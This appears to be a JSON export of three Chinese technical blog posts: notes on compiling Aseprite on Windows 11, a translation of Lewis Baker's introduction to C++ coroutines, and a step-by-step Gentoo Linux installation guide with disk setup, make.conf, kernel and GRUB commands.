[{"categories":["posts"],"content":"Aseprite 官网版本和 Steam 版本对于我来说都比较贵，好在是一个开源软件，可以动动手指选择自己编译，本文记录下编译流程，方便有需要的小伙伴参考。\n下载 Aseprite 源码 到 这里 下载你需要安装版本的 zip 包到本地目录，（我为了方便描述这里和之后都使用自己命名的目录，你可以根据实际情况调整），比如 D:/Apps/Aseprite ，解压到当前目录，我这里解压后目录为 D:/Apps/Aseprite/Aseprite-Src 。官方的自编译教程可以到 这里 查看。\n电脑里有安装过对应包的，之后内容可以选择性跳过。\n下载 Cmake 和 Ninja 由于 Aseprite 使用 cmake 编译，所以我们先下载 cmake ，再下载 ninja（编译更快）。\n在 这里 下载最新版本 cmake （Binary distributions 下面找到 Windows x64 ZIP）到 D:/Bin/CC ，解压后 cmake 目录为 D:/Bin/CC/cmake ，确保文件夹内有 bin 。 在 这里 下载最新版本 ninja-win.zip 到 D:/Bin/CC ，解压后为一个可执行exe文件，移动到 D:/Bin/CC/cmake/bin 目录下面。 打开环境变量编辑器（直接 Windwos 搜索环境变量）-\u003e 环境变量 -\u003e 用户或系统环境变量 -\u003e PATH -\u003e 编辑 -\u003e 添加一行：D:/Bin/CC/cmake/bin -\u003e 关闭。 下载 Skia Aseprite 编译依赖 Skia ，到 这里 下载最新 Skia-Windows-Release-X64.zip 到 D:/Bin/Skia ，然后解压，确保Skia根目录在 D:/Bin/Skia ，即解压后路径有 D:/Bin/Skia/include 。\n下载 Visual Studio生成工具 到 这里 下载 Microsoft C++ 生成工具后打开，工作负载选择使用C++的桌面开发，单个组件再勾选上当前Windows 版本的 SDK，比如 Win11 选择任一 Windows 11 SDK ，方便起见工作负载直接再多勾选一个 Windwos 桌面开发也行，安装位置可以自行修改，之后等待安装完成。\n不太清楚工具使用的可以搜索其他更详细的文章说明，这里就不赘述了哈哈。\n开始编译 使用 Windows 自带搜索，搜索 Native Tools ，找到 X64 Native Tools Command Prompt for VS ... 进行打开。 进入 Aseprite 源码目录：输入 cd /d D:/Apps/Aseprite/Aseprite-Src 回车，具体目录请根据你自己情况选择，下同。 创建临时编译目录并进入临时目录：输入 mkdir build 回车，再输入 cd /d build 回车。 构建 Ninja 及 Cmake 文件：输入 cmake -DCMAKE_BUILD_TYPE=RelWithDebInfo -DLAF_BACKEND=skia -DSKIA_DIR=D:\\Bin\\Skia -DSKIA_LIBRARY_DIR=D:\\Bin\\Skia\\out\\Release-x64 -DSKIA_LIBRARY=D:\\Bin\\Skia\\out\\Release-x64\\skia.lib -G Ninja .. 回车，记得替换 Skia 目录为自己目录。 开始构建：输入 ninja aseprite 回车，等待构建完成。 构建完成后可执行文件在 \u003cAseprite源码根目录\u003e/build/bin 下，可以拷贝整个 bin 目录到其他地方，双击带图标的 exe 文件即可运行，要进行升级或降级只需下载对应版本源码到指定位置，重复本节编译流程之后复制 bin 目录替换当前版本即可。\n汉化与主题 到 这里 查看相关语言汉化包说明进行下载。需要注意新版本可能无法双击扩展文件进行安装，需要手动到软件内部首选项扩展里面添加。\n","description":"Win11 下自编译 aseprite 记录","tags":["日常\""],"title":"Win11 编译 aseprite（2023）","uri":"/posts/id/11182136/"},{"categories":["posts"],"content":" 本文为 lewissbaker coroutine-theory 翻译，做了部分修改，个人翻译能力有限，采用了机器翻译，内容仅供参考，如有疑问请参考原文！\n这是关于 C++ Coroutines TS（协程） 系列文章的第一篇，C++协程是C++20新增的一种新的语言功能。\n在本系列中我将介绍 C++协程 的底层工作机制，并展示如何利用C++20提供的接口来构建有用的高级抽象。\n在这篇文章中，我将描述C++函数与协程的区别，并介绍一些它们的一些操作。本文的目的是介绍一些基本概念，这些概念有助于您构建对C++协程的思考方式。\n协程是函数，也是协程 协程是函数的泛化，允许暂停函数，然后恢复。我将更详细地解释这意味着什么，但在此之前，我想首先回顾一下 “普通” C++函数是如何工作的。\n“普通” 函数 一个普通的函数可以认为有两个操作：Call 和 Return （请注意，我在这里将“抛出异常”大致归入 Return 操作）。\nCall 操作会创建一个激活帧(activation frame)，暂停调用方函数的执行，并转移到被调用函数的开头开始执行。Return 操作将返回值传递给调用方，销毁激活帧，然后在调用方调用函数的点之后继续执行。\n让我们再分析下这些语义 . . . . . .\n激活帧(activation frame) 您可以将激活帧看作保存特定函数调用的当前状态的内存块。该状态包括传递给它的任何参数的值以及任何局部变量的值。\n对于 “普通” 函数，激活帧还包括返回地址（从函数返回后将转移到该指令的地址处执行）和调用函数的激活帧地址。我们可以把这些信息看作是函数调用的 “延续”，也就是说，它们描述了当函数调用完成时，哪个函数的调用应该在哪个位置继续执行。\n在 “普通” 函数中，所有激活帧的生命周期都是严格嵌套的。这种严格的嵌套允许使用高效的内存分配数据结构为每个函数调用分配和释放激活帧，这种数据结构通常被称为 \"堆栈（Stack）\"。\n在栈这种数据结构上分配激活帧时，它通常称为 “栈帧”。\n这种堆栈数据结构非常常见，以至于大多数（全部？）CPU 架构都有一个专用寄存器来保存堆栈顶部的指针（例如 X64 中的 rsp 寄存器）。要为新的激活帧分配内存或释放激活帧内存，只需将该寄存器增加或减少帧大小即可。\n调用（Call）操作 当一个函数调用另一个函数时，调用方必须先做好挂起的准备。\n这个 “挂起（suspend）” 步骤通常包括将当前保存在 CPU 寄存器中的任何值保存到内存中，这样当函数恢复执行时就可以根据需要恢复这些值。根据函数的调用习惯，调用者和被调用者可能会就谁保存这些寄存器值进行协调，但您仍可以将其视为调用操作的一部分。\n调用者还会将传递给被调用函数的参数值存储到新的激活帧中，以便函数访问。\n最后，调用者将调用者的恢复点地址写入新的激活帧，并转移到被调用函数的起点执行。在 X86/X64 体系结构中，最终操作有自己的指令，即 call 指令，该指令将下一条指令的地址写入堆栈，将堆栈寄存器递增地址的大小，然后跳转到指令操作数中指定的地址。\n返回（Return）操作 当函数通过 return 语句返回时，该函数首先将返回值（如果有）存储在调用方可以访问的位置。这可能位于调用方的激活帧或函数的激活帧中（对于跨越两个激活帧之间边界的参数和返回值，区别可能会变得有点模糊）。\n然后，该函数通过以下方式销毁激活帧：\n在返回点销毁范围内的任何局部变量。 销毁任何参数对象 释放激活帧使用的内存 最后，它通过以下方式恢复调用方的执行： 通过将堆栈寄存器设置为指向调用方的激活帧并还原可能已被函数破坏的任何寄存器来还原调用方的激活帧。 跳转到在 \"Call\" 操作期间存储的调用者的恢复点。 注意，与 \"Call\" 操作一样，某些调用约定可能会在调用方和被调用方函数的指令中拆分 \"Return\" 操作的职责。 协程 通过将 call 和 return 操作中执行的一些步骤分离为三个额外的操作，协程对函数的操作进行了概括： 暂停（Suspend）、恢复（Resume）和销毁（Destroy）。\nSuspend 操作在函数中的当前点挂起协程的执行，并将执行权传输回调用方或恢复方，而不会破坏激活帧。协程挂起后，挂起点范围内的任何对象都将保持存活。需要注意的是，与函数的 return 操作一样，只有在协程明确定义的挂起点上，才能从协程内部挂起例程。\nResume 操作可在暂停的位置恢复暂停的协程的执行，这将重新激活协程的激活帧。\nDestroy 操作会销毁激活帧，而不会恢复协程执行。任何在挂起点处于作用域内的对象都将被销毁。用于存储激活帧的内存也将被释放。\n协程激活帧（Coroutine activation frames） 由于协程可以在不破坏激活帧的情况下挂起，因此我们无法再保证激活帧生命周期是严格嵌套的。这意味着协程激活帧通常不能使用堆栈数据结构进行分配，因此可能需要存储在堆上。\nC++协程中有一些规定，如果编译器能保证协程的生命周期确实严格嵌套在调用者的生命周期内，则允许从调用者的激活帧中为协程帧分配内存。如果编译器足够智能，这在很多情况下都可以避免堆分配。\n对于协程，激活帧的某些部分需要在协程挂起期间保留，而有些部分只需要在协程执行时保留。例如，作用域不跨越任何协程挂起点的变量的生命周期可能会存储在堆栈上。\n从逻辑上讲，可以将协程的激活帧视为由两部分组成：“协程帧” 和 “堆栈帧”。“协程帧” 包含协程激活帧的一部分，该帧在协程挂起时仍然存在，而 “堆栈帧” 部分仅在协程执行时存在，并在协程挂起并将执行权传输回调用方/恢复方时释放。\n挂起/暂停（Suspend）操作 协程的挂起操作允许协程在函数中间挂起执行，并将执行权传输回协程的调用方或恢复方。\n协程主体中的某些点被指定为挂起点。在C++协程中，这些挂起点由 co_await 或 co_yield 关键字的用法标识。\n当协程遇到这些挂起点之一时，它首先通过以下方式为协程恢复做好准备：\n确保寄存器中保存的任何值都写入协程帧。 将值写入协程帧，该值指示协程在哪个挂起点挂起。这样，后续的 Resume 操作知道在哪里恢复协程的执行，后续的 Destroy 也知道哪些值在范围内并且需要销毁。 一旦协程准备好恢复，协程将被视为“suspended”。\n然后，在执行权被转回调用方/恢复方之前，协程有机会执行一些附加逻辑。这些附加逻辑可以访问到协程帧的句柄，以后可以用该句柄来恢复或销毁协程帧。\n这种在协程进入“暂停”状态后执行附加逻辑的能力，使得协程可以在进入“暂停”状态前被调度恢复，而无需进行同步。如果没有这种能力，则协程在进入“暂停”状态之前被调度恢复，就需要进行同步，因为协程可能会被暂停或恢复，存在竞态条件。我将在以后的文章中详细介绍这一点。\n然后，协程可以选择立即恢复/继续执行协程，也可以选择将执行权转移回调用方/恢复方。如果将执行权转移到调用方/恢复方，则协程激活帧的堆栈帧部分将被释放并从堆栈中弹出。\n恢复（Resume）操作 可以在当前处于“挂起”状态的协程上执行 Resume 操作。\n当一个函数想要恢复一个协程执行时，可以通过在对应协程句柄上调用 void resume() 方法完成。\n就像普通的函数调用一样，调用 resume() 会分配一个新的栈帧，并将调用者的返回地址存储在栈帧中，然后将执行权转移到该函数。但是，它不会将执行权转移到函数的开头，而是将执行权转移到函数中上次挂起的点。它通过从协程帧加载恢复点并跳转到该点来实现此目的。\n当协程下一次挂起或运行完成时，对 resume() 的调用将返回并恢复调用函数的执行。\n销毁（Destory）操作 Destroy 操作会销毁协程帧，而不会恢复协程的执行。此操作只能在挂起的协程上执行。\nDestroy 操作的作用与 Resume 操作非常相似，因为它会重新激活协程的激活帧，包括分配新的堆栈帧和存储 Destroy 操作调用方的返回地址。\n但是，它不会将执行权转移到最后一个挂起点的协程主体，而是转移到另外的代码路径，该路径会在挂起点调用范围内所有局部变量的析构函数，然后释放协程帧使用的内存。\n与 Resume 操作类似，可以在协程挂起期间通过调用其协程句柄的 void destroy() 方法销毁协程帧。\n协程的调用（Call）操作 协程的 Call 操作与普通函数的调用操作大致相同。事实上，从调用者的角度来看，没有区别。但是，使用协程时，调用操作不会仅在函数运行完成时才返回给调用方，而是在协程到达其第一个挂起点时恢复调用方的执行。\n在协程上执行 Call 操作时，调用方分配一个新的栈帧，将参数写入栈帧，将返回地址写入栈帧，并将执行权转移到协程，这与调用普通函数完全相同。\n然后，协程做的第一件事是在堆上分配一个协程帧，并将参数从堆栈帧复制/移动到协程帧中，以便参数的生命周期能超出协程第一个挂起点。\n协程的返回（Return）操作 协程的 Return 操作与普通函数的返回操作略有不同。\n当协程执行 co_return 操作时，它会将返回值存储在某个位置（可由协程自定义其存储位置），然后析构任何协程范围内的局部变量（但不包括参数）。\n然后，协程有机会在将执行权传输回调用方/恢复方之前执行一些额外的逻辑。此附加逻辑可能会执行某些操作来发布返回值，或者它可能会恢复另一个正在等待结果的协程。它是完全可定制的。\n然后，协程执行 Suspend 操作（使协程帧保持活动状态）或 Destroy 操作（销毁协程帧）。之后，根据 Suspend/Destroy 操作语义，将执行权传输回调用方/恢复方，将激活帧的栈帧从堆栈中弹出。\n值得注意的是，传给 co_return 操作的返回值与 Call 操作返回的返回值不同，因为 co_return 操作可能在调用者从初始 Call 操作恢复后很久才执行。\n小插图 为了更好地将这些概念放入图片中，我想通过一个简单的示例来演示当协程被调用、挂起和稍后恢复时会发生什么。\n现在，假设我们有一个函数（或协程）f() ，它调用协程 x(int a) 。\n在 Call 之前，它看起来有点像这样：\nSTACK REGISTERS HEAP +------+ +---------------+ \u003c------ | rsp | | f() | +------+ +---------------+ | ... | | | 然后，当调用 x(42) 时，它首先为 x() 创建一个堆栈帧，就像普通函数一样：\nSTACK REGISTERS HEAP +----------------+ \u003c-+ | x() | | | a = 42 | | | ret= f()+0x123 | | +------+ +----------------+ +--- | rsp | | f() | +------+ +----------------+ | ... | | | 然后，一旦协程 x() 在堆上为协程帧分配了内存，并将参数值复制/移动到协程帧中，我们最终会得到如下图所示的内容。请注意，编译器通常会将协程帧的地址保存在堆栈指针的单独寄存器中（例如。MSVC 将其存储在 rbp 寄存器中）：\nSTACK REGISTERS HEAP +----------------+ \u003c-+ | x() | | | a = 42 | | +--\u003e +-----------+ | ret= f()+0x123 | | +------+ | | x() | +----------------+ +--- | rsp | | | a = 42 | | f() | +------+ | +-----------+ +----------------+ | rbp | ------+ | ... | +------+ | | 如果协程 x() 随后调用另一个普通函数 g() ，它将看起来像这样：\nSTACK REGISTERS HEAP +----------------+ \u003c-+ | g() | | | ret= x()+0x45 | | +----------------+ | | x() | | | coroframe | --|-------------------+ | a = 42 | | +--\u003e +-----------+ | ret= f()+0x123 | | +------+ | x() | +----------------+ +--- | rsp | | a = 42 | | f() | +------+ +-----------+ +----------------+ | rbp | | ... | +------+ | | 当 g() 返回时，它将销毁其激活帧并恢复 x() 的激活帧。假设我们将 g() 的返回值存储在协程帧中的局部变量 b 中：\nSTACK REGISTERS HEAP +----------------+ \u003c-+ | x() | | | a = 42 | | +--\u003e +-----------+ | ret= f()+0x123 | | +------+ | | x() | +----------------+ +--- | rsp | | | a = 42 | | f() | +------+ | | b = 789 | +----------------+ | rbp | ------+ +-----------+ | ... | +------+ | | 如果 x() 现在遇到挂起点并在不破坏其激活帧的情况下暂停执行，则执行权将返回到 f() 。\n这会导致 x() 的栈帧部分从堆栈中弹出，同时将协程帧留在堆上。当协程首次挂起时，将返回一个值给调用方。此返回值通常包含挂起的协程帧的句柄，可用于稍后恢复它。当 x() 挂起时，它还将 x() 的恢复点的地址存储在协程帧中（对于恢复点，则将其命名为 RP ）：\nSTACK REGISTERS HEAP +----\u003e +-----------+ +------+ | | x() | +----------------+ \u003c----- | rsp | | | a = 42 | | f() | +------+ | | b = 789 | | handle ----|---+ | rbp | | | RP=x()+99 | | ... | | +------+ | +-----------+ | | | | | | +------------------+ 此句柄现在可以作为函数之间的正常值传递。在稍后的某个时间点，可能来自不同的调用堆栈，甚至在不同的线程上，某些东西（例如， h() ）将决定恢复该协程的执行。例如，当异步 I/O 操作完成时。\n恢复协程的函数调用 void resume(handle) 函数来恢复协程的执行。对于调用方来说，这看起来就像对具有单个参数的 void 返回函数的任何其他正常函数调用一样。\n这将创建一个新的栈帧，该帧将调用方的返回地址记录到 resume() ，通过将协程帧的地址加载到寄存器中来激活协程帧，并在存储在协程帧中的恢复点恢复执行 x() ：\nSTACK REGISTERS HEAP +----------------+ \u003c-+ | x() | | +--\u003e +-----------+ | ret= h()+0x87 | | +------+ | | x() | +----------------+ +--- | rsp | | | a = 42 | | h() | +------+ | | b = 789 | | handle | | rbp | ------+ +-----------+ +----------------+ +------+ | ... | | | 总结 我将协程描述为一个函数的泛化，除了 “普通” 函数提供的 \"Call\" 和 \"Return\" 操作外，它还具有三个附加操作—— \"Suspend\"、\"Resume\" 和 \"Destory\"。\n我希望这能为如何思考协程及其控制流提供一些有用的帮助。在下一篇文章中，我将介绍 C++协程语言扩展的机制，并解释编译器如何将您编写的代码转换为协程。\n","description":"","tags":["Code","C++基础"],"title":"C++协程01 协程概述","uri":"/posts/id/11041720/"},{"categories":["posts"],"content":"最近打算将手上的 AMD Linux 切换到 Gentoo，写一篇文章记录下安装过程。\n本文可能不适用于Linux新手，无论你是Linux安装老手还是对于无UI的Linux安装过程不太了解，都建议你在有任何疑惑时优先查看Gentoo官方Wiki，本文仅作为安装参考，而且安装过程中一些概念我也没有进行详细解释。 当然，我会在每个小结最后贴上部分参考链接，方便查阅。\nGentoo 安装过程很长，请准备充足的时间再尝试安装，否则中断后再进行比较麻烦！\n关于Gentoo Gentoo也是一个历史比较悠久的Linux发行版，特点是系统安装最小化，允许用户自行选择各种软件包完成系统组装，软件安装采用源码编译，针对每个设备进行过优化，软件运行效率可能更高。软件包更新没有ArchLinux激进，但又不至于像Debian那样总是使用稳定的软件版本。\n参考：\nGentoo 官网 Gentoo Wiki Gentoo 百度百科 准备安装介质 Gentoo安装不同于Ubuntu、Arch那样使用自己的安装介质，Gentoo允许你使用其他Linux安装介质，因为Gentoo安装只需要借助安装介质中的各种工具，比如磁盘格式化、连接网络下载文件等。由于我从Arch换到Gentoo，所以我这里直接使用了Arch的安装介质，比较方便而且Arch安装介质中的 fstab 工具也蛮好用的。\n当然Gentoo也提供了官方的安装介质，篇幅原因这里不介绍如何烧录Linux安装介质到U盘中，Windows用户可以使用 rufus ，ArchLinux ISO 下载地址：清华镜像站-ArchLinux 。\n参考\nGentoo Wiki - 选择正确的安装介质 知乎 - Rufus制作USB启动盘 网络配置 烧录好安装介质后可以插上U盘并启动到 LiveCD 系统了，安装介质中提供了基础的Linux运行环境，首先要做的就是配置好网络与时间，方便之后下载文件和软件包。\nArchLinux安装介质中包含了 iwd 软件包，可以帮助我们连接到Wifi：\n1 2 3 4 5 6 7 8 9 10 rfkill unblock all # 可以启用被内核禁用的设备 iwctl # 回车后进入iwd操作界面 ---------- iwd 界面 ---------- [iwd] help # 可以查看iwd相关命令 [iwd] device list # 可以查看当前网卡设备，wifi一般为 wlan0 wlan1等 [iwd] station \u003cdevice\u003e scan # 使用\u003cdevice\u003e网卡扫描可用的网络 [iwd] station \u003cdevice\u003e get-networks # 显示当前扫描到的网络 [iwd] station \u003cdevice\u003e connect \u003cwifi name\u003e # 连接wifi，如果有密码会提示输入密码 [iwd] quit // 退出iwd操作界面 ----------------------------- 配置好网络后需要确保当前系统时间是否正常，输入 date 查看当前日期，如果相差太远，需要先进行时间同步，否则无法下载网络文件。一般情况下电脑主板都会记录时间，不会相差太多。\nGentoo官方介质中提供了 chronyd 软件，可以使用 chronyd -q 进行同步，当然也可以手动进行设置，使用 date 命令来对系统时钟执行手动设置。它使用以下格式作为参数：使用 MMDDhhmmYYYY 语法（Month（月），Day（天），hour（小时），minute（分钟） 和 Year（年））。比如设置时间到 2023年9月16日20:30 ：\n1 date 091620302023 参考：\nGentoo Wiki - 配置网络 Arch Installation - 连接到互联网 准备磁盘 跟其他Linux发行版安装一样，在安装前进行磁盘分区与格式化。\n我习惯将 home 分区单独分区，所以我需要准备四个分区，分区大小按照我的情况推荐，具体根据自身情况分配：\n设备位置(ssd可能为/dev/nvme0n1) 挂载位置 文件系统格式 推荐大小 说明 /dev/sda1 /boot vfat \u003e=500M 挂载引导分区，如果双系统安装该分区应该已经存在 /dev/sda2 /home ext4/btrfs/... \u003e= 100G 用户目录，平时使用用户软件数据存放位置，稍微大一点 /dev/sda3 / ext4/btrfs/... \u003e= 60G 系统其他目录，包括系统软件、可执行文件、日志等，稍微大一点 /dev/sda4 swap 系统内存/2左右 交换空间，有休眠需求或者大型软件使用 使用 cfdisk 进行分区划分，有UI操作界面，比 fdisk 更直观，之后进行格式化：\n1 2 3 4 5 6 7 8 9 # 格式化 boot 分区，双系统如果已经存在，可以逃过格式化boot分区，之后直接挂载 mkfs.vfat -F 32 /dev/sda1 # 格式化 home 与根分区 mkfs.ext4 /dev/sda2 mkfs.ext4 /dev/sda3 # 格式化swap mkswap /dev/sda4 # 激活swap swapon /dev/sda4 创建根目录：\n1 mkdir -pv /mnt/gentoo 挂载根目录\n1 mount -v /dev/sda3 /mnt/gentoo 参考：\nGentoo Wiki - 准备磁盘 安装Gentoo安装文件 Gentoo提供了几种不同的安装文件，主要分为 multilib(32+64位) 、no-multilib(64位) 、systemd 、openrc 几种组合，如果没有systemd需求则使用openrc版本，对于 no-multilib ，一般人不要选择。\n不同版本会影响之后系统配置，由于是源码安装，安装好后再切换配置会变得非常麻烦，请考虑清楚后再决定！！！\n下载地址：\nGentoo官方 TUNA镜像 USTC镜像 Aliyun镜像 使用 curl、wget等工具下载需要的版本到 /mnt/gentoo 目录下，之后进行解压：\n1 2 3 4 # 进入目录 cd /mnt/gentoo # 解压缩，包含一个基本的Linux文件系统 tar xpvf stage3-*.tar.xz --xattrs-include='*.*' --numeric-owner 参考：\nGentoo Wiki 配置编译选项和镜像 本节内容非常重要，涉及到了Gentoo中优化和配置系统的主要内容以及包管理器相关知识，建议认真阅读参考链接！！！\nGentoo支持包管理器，并支持一些系统变量，编译软件时会从特定文件读取这些系统变量，可以通过配置环境变量达到调整系统的作用。配置编译选项的文件位于系统 /etc/portage/make.conf ，当前位于 /mnt/gentoo/etc/portage/make.conf ，下面是一些变量的说明：\nCFLAGS ：定义GCC编译优化标志，一般修改为 CFLAGS=\"-march=native -O2 -pipe\" 即可，-march指定cpu架构，不清楚填 native 即可，可在 此处 查看，配合设置 CHOST 变量。 CXXFLAGS ：C++编译优化标志，同上即可。 MAKEOPTS ：指定编译时使用线程数量，越大越快，内存消耗越大，根据cpu核心数设置，不要太大，比如8核心16线程可以设置为 MAKEOPTS=\"-j6\" 。 GENTOO_MIRRORS ：指定Gentoo软件包镜像，比如 USTC镜像 ：GENTOO_MIRRORS=\"https://mirrors.ustc.edu.cn/gentoo/\" ，根据具体镜像站设置。 USE ：控制系统软件包使用哪些和不使用哪些功能，参考wiki。 EMERGE_DEFAULT_OPTS ：emerge 默认选项，具体参考 Gentoo Emerge。 ACCEPT_KEYWORDS ：允许的软件包架构，如果需要使用测试版软件，务必加上 ACCEPT_KEYWORDS=\"~amd64\" 。 ACCEPT_LICENSE ：允许的软件许可协议，直接设置为允许全部即可：ACCEPT_LICENSE=\"*\"。 L10N ：系统语言，一般允许中、英文即可：L10N=\"en-US zh-CN en zh\" 。 CPU_FLAGS_X86 ：针对特定cpu的编译选项，系统安装好之后安装 app-portage/cpuid2cpuflags 软件，使用 cpuid2cpuflags 获取，然后写入该变量中。 VIDEO_CARDS ：根据显卡设置。 其他 ：参考 Gentoo Wiki - make.conf 。 还需要配置 portage 镜像，官方的日常使用太慢，配置文件位于：/etc/portage/repos.conf/gentoo.conf，LiveCD为：/mnt/gentoo//etc/portage/repos.conf/gentoo.conf，没有可以新建：\n1 2 3 4 5 6 7 8 9 [DEFAULT] main-repo = gentoo [gentoo] location = /var/portage sync-type = rsync # TUNA镜像站 sync-uri = rsync://mirrors.tuna.tsinghua.edu.cn/gentoo-portage/ auto-sync = yes 参考链接：\nGentoo Wiki - make.conf Gentoo Wiki - 配置编译选项 Gentoo Wiki - 使用USE标记 Gentoo Wiki - Portage介绍 Gentoo Wiki - 环境变量 下面是一个 make.conf 文件例子，仅供参考：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ########### Build Flags ########## BUILD_FLAGS=\"-march=native -O2 -pipe\" CFLAGS=\"${BUILD_FLAGS}\" CXXFLAGS=\"${BUILD_FLAGS}\" CHOST=\"x86_64-pc-linux-gnu\" MAKEOPTS=\"-j6\" # 使用 cpuid2cpuflags命令后写入其中 # CPU_FLAGS_X86=\"\" ########## USE Flags ########## USE_YES=\"git pulseaudio ext4 cjk\" USE_NO=\"-systemd -gnome -gnome-keyring -bindist\" USE_OTHER=\"python lua\" USE=\"${USE_YES} ${USE_NO} ${USE_OTHER}\" ########## Portage And Emerge Config ########## PORTAGE_DIR=\"/var/portage\" DISTDIR=\"${PORTAGE_DIR}/dist\" PKGDIR=\"${PORTAGE_DIR}/pkgs\" GENTOO_MIRRORS=\"https://mirrors.tuna.tsinghua.edu.cn/gentoo/\" EMERGE_DEFAULT_OPTS=\"--ask --verbose=y --keep-going --with-bdeps=y\" ACCEPT_KEYWORDS=\"~amd64\" ACCEPT_LICENSE=\"*\" ########## Other Config ########## # Language L10N=\"en-US zh-CN en zh\" LINGUAS=\"en_US zh_CN en zh\" # Video Cards VIDEO_CARDS=\"intel nvidia radeon vesa\" # Grub Platform GRUB_PLATFORMS=\"efi-64\" # ... 进入Gentoo环境 复制DNS信息：\n1 cp --dereference /etc/resolv.conf /mnt/gentoo/etc/ 挂载必要的文件系统：\n1 2 3 4 5 6 7 mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run 如果使用非Gentoo安装介质，可能需要额外操作：\n1 2 3 test -L /dev/shm \u0026\u0026 rm /dev/shm \u0026\u0026 mkdir /dev/shm mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm chmod 1777 /dev/shm /run/shm chroot进入Gentoo环境：\n1 2 3 4 5 6 7 8 # Arch安装介质使用 # arch-chroot /mnt/gentoo # 官方安装介质使用 chroot /mnt/gentoo /bin/bash # 加载环境变量 source /etc/profile # 设置提示符，区分环境 export PS1=\"(chroot) ${PS1}\" 现在开始所有操作都是在Gentoo环境下进行！\n挂载Boot和Home分区（如果有）：\n1 2 mount /dev/sda1 /boot mount /dev/sda2 /home 参考链接：\nGentoo Wiki 配置 Portage 并更新系统 先使用镜像快照更新数据库(通常为24小时内快照)：\n1 emerge-webrsync 进一步更新到一小时内最新数据库：\n1 2 3 emerge --sync # 也可以使用 emerge --sync --quiet 更新完数据库后，可能会发布一些最新通知，建议查看，以查看某些大的更改：\n1 2 eselect news list eselect news read 选择配置文件，不同配置文件包含了不同的软件包及其依赖，更换配置文件后USE标记也会更新，之后需要对整个系统进行更新来应用更改，比如某些软件更改，依赖该软件的其他软件可能需要重新编译。\n列出所有配置并选择：\n1 2 3 4 # 列出 eselect profile list # 选择 eselect profile set \u003c序号\u003e 更换配置文件或者更改USE标记后，使用下面命令进行系统更新，之后就是漫长的编译安装过程，期间可以玩几把游戏或者看剧 -_- ：\n1 emerge --ask --verbose --update --deep --newuse @world 期间如果遇到循环依赖等情况，那就自求多福，查看Wiki如何解决吧，刚开始USE不要写太多，这样可以避免一些问题，不过随着USE越来越多，很难避免这些情况。\n跑完之后，再检查一遍是否更新完成：\n1 2 3 emerge @preserved-rebuild perl-cleaner --all emerge -auvDN --with-bdeps=y @world 参考链接：\nGentoo Wiki 配置时区与区域 国内下面这样设置即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 时区上海，其他时区使用 ls /usr/share/zoneinfo 查看 echo \"Asia/Shanghai\" \u003e /etc/timezone # openrc使用 emerge --config sys-libs/timezone-data # systemd使用 ln -sf ../usr/share/zoneinfo/Europe/Brussels /etc/localtime nano /etc/locale.gen ---------------------- en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 ---------------------- # 生成指定地区 locale-gen # 查看可用区域 eselect locale list # 选择，建议英文，X换为上面序号 eselect locale set X 参考链接：\nGentoo Wiki 配置文件系统 fstab配置，UUID可以使用 blkid 查看 :\n1 2 3 4 5 6 7 8 nano /etc/fstab ---------------------- UUID=xxxxxxxxxxx /boot vfat defaults 0 0 UUID=xxxxxxxxxxx / ext4或btrfs等 defaults 0 0 UUID=xxxxxxxxxxx /home ext4或btrfs等 defaults 0 0 UUID=xxxxxxxxxxx none swap defaults 0 0 ---------------------- 如果使用 btrfs 文件系统，需要提前安装 emerge sys-fs/btrfs-progs 。\n参考链接：\nGentoo Wiki 其他配置 修改主机名： 1 2 # Gentoo 主机名文件位置跟其他Linux发行版有所区别 echo hostname=\\\"Gentoo\\\" \u003e /etc/conf.d/hostname 配置网络： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # NetworkManager 方便连接 Wifi emerge -av networkmanager net-misc/dhcpcd net-wireless/wpa_supplicant # 设置开机自启动 rc-update add NetworkManager default rc-update add dhcpcd default # systemd # systemctl enable NetworkManager # systemctl enable dhcpcd # 编辑 /etc/hosts 文件，设置本机IP nano /etc/hosts ----------------- 127.0.0.1 localhost ::1 localhost 127.0.0.1 \u003c上面设置的主机名\u003e.localdomain \u003c主机名\u003e ----------------- 安装内核 自己配置内核很麻烦，所以建议在安装阶段先使用 Gentoo 官方内核，等开机后有时间再自己去配置优化自己的内核。\n1 2 3 4 5 6 7 8 9 10 # 安装固件 emerge -av sys-kernel/linux-firmware # 安装内核源码 emerge -av sys-kernel/gentoo-sources # 安装内核配置工具 emerge -av sys-kernel/genkernel # 编译安装内核 genkernel --menuconfig all genkernel --install initramfs 安装必要的软件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # 安装日志工具 (openrc) emerge -av sysklogd rc-update add sysklogd default # cron守护进程 emerge -av sys-process/cronie rc-update add cronie default # shell补全 emerge -av app-shells/bash-completion # 时间同步 emerge --ask net-misc/chrony rc-update add chronyd default # systemd # systemctl enable chronyd.service # 安装sudo emerge -av sudo # 安装vim、git emerge -av vim git # 配置root权限 sed -i 's/\\# \\%wheel ALL=(ALL) ALL/\\%wheel ALL=(ALL) ALL/g' /etc/sudoers # 重置root密码 passwd 配置引导： 安装 Grub 前检查 /etc/portage/make.conf 文件是否设置了 GRUB_PLATFORMS=\"efi-64\" ，没有则需要添加：\n1 echo 'GRUB_PLATFORMS=\"efi-64\"' \u003e\u003e /etc/portage/make.conf 安装 Grub 并配置：\n1 2 3 4 5 emerge -av sys-boot/grub # 将grub安装到/boot/grub，如果双系统已经安装过grub，则先删除/boot/grub目录 grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo # 生成配置文件 grub-mkconfig -o /boot/grub/grub.cfg 添加用户 1 2 3 4 # 添加一个管理员账户 useradd -m -G users,wheel,portage,usb,video \u003c你的用户名(小写)\u003e # 修改密码 passwd \u003c用户名\u003e 参考链接：\nGentoo Wiki - 0 Gentoo Wiki - 1 收尾工作 最后再检查一遍下面的配置是否正确：\n/boot目录下是否有内核即Grub文件 /etc/fstab 文件挂载目录是否正确 用户及root权限、密码 必要的工具比如网络配置软件 确定无误后重启进入系统：\n1 2 3 4 5 6 